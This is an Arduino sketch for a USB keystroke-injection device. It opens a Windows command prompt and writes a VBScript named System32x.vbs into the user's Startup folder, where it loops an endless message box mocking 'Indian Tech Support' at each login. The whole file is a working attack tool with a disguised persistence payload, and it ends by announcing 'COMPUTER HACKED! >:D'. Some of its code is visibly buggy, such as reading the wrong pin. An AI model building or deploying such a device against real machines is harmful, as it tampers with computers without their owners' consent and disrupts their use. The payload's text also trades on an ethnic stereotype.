#include "Keyboard_sv_SE.h"
#include "Keyboard.h"

char windowsKey = KEY_RIGHT_GUI;
char enterKey = KEY_RETURN;
char tabKey = KEY_TAB;
char altKey = KEY_LEFT_ALT;

bool hacked = false;
bool jumperConnected = false;

enum pin{
  JumperPin = 2,
  LightPin = 13,
};

enum delayType{
  Zero = 0,
  Fast = 400,
  Slow = 1000  
};

void setup() {
  Serial.begin(9600);
  pinMode(JumperPin, INPUT);
  pinMode(LightPin, OUTPUT);
}

void loop() {
  delay(Slow);
  jumperConnected = digitalRead(LightPin);
  delay(Slow);
  if(jumperConnected){
      if(hacked) {
        digitalWrite(LightPin, HIGH);
        delay(Fast);
        digitalWrite(LightPin, LOW);
        delay(Fast);
      }
      else{
        Keyboard.begin(KeyboardLayout_sv_SE);

        delay(Slow);

        char openRunKeys[] = {windowsKey, 'r'};
        PressKeys(openRunKeys, 2);
        delete openRunKeys;

        delay(Fast);

        PressAndRelease('c');
        PressAndRelease('m');
        PressAndRelease('d');

        delay(Fast);

        PressAndRelease(KEY_RETURN);


        delay(Fast);

        Keyboard.print("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");

        Keyboard.print("del System32x.vbs");

        Keyboard.print("echo do > System32x.vbs");

        Keyboard.print("echo msgbox(\"Indian Tech Support Is Here\") >> System32x.vbs");

        Keyboard.print("echo loop >> System32x.vbs");

        ConsoleWrite("System32x.vbs");

        delay(Slow);

        char switchBackToCmdKeys[] = {altKey, tabKey};
        PressKeys(switchBackToCmdKeys, 2);
        delete switchBackToCmdKeys;

        delay(Slow);

        char closeCmdKeys[] = {altKey, KEY_F4};
        PressKeys(closeCmdKeys, 2);
        delete closeCmdKeys;

        Serial.println("COMPUTER HACKED! >:D");

        hacked = true;

        Keyboard.end();
      } 
    }
  else{
    Serial.println("NO JUMPER");
  }
}

void PressKeys(char keys[], int keysLength){
  for(int i = 0; i < keysLength; i++){
    Keyboard.press(keys[i]);
  }

  for(int i = 0; i < keysLength; i++){
  Keyboard.release(keys[i]);
  }
}

void PressAndRelease(char key){
  Keyboard.press(key);
  Keyboard.releaseAll();
}

void ConsoleWrite(String message){
  Keyboard.print(message);
  Keyboard.press(enterKey);
  Keyboard.release(enterKey);
}